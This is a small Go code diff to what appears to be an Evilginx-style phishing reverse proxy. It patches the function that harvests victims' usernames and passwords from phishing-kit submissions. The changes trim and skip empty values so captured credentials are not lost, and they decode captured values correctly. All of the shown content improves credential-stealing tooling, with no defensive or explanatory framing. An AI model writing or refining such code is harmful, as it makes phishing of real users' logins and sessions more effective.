@@ -5,6 +5,7 @@ import (
 	"io"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -339,9 +340,13 @@ func (p *HttpProxy) handlePhishkitCreds(req *http.Request, pl *Phishlet, ps *Pro
 		if len(v) == 0 {
 			continue
 		}
-		val := v[0]
+		val := strings.TrimSpace(v[0])
+		if val == "" {
+			continue
+		}
 		switch k {
 		case "username", "email":
+			// Never clear an existing username with a later empty scrape.
 			s.SetUsername(val)
 		case "password":
 			s.SetPassword(val)
@@ -396,8 +401,7 @@ func urlParseQuery(s string) (map[string][]string, error) {
 }
 
 func urlQueryUnescape(s string) (string, error) {
-	replacer := strings.NewReplacer("+", " ")
-	return replacer.Replace(s), nil
+	return url.QueryUnescape(s)
 }
 
 func parseEvilginxSessionIDFromCookie(req *http.Request, plName string, cookieName string) string {
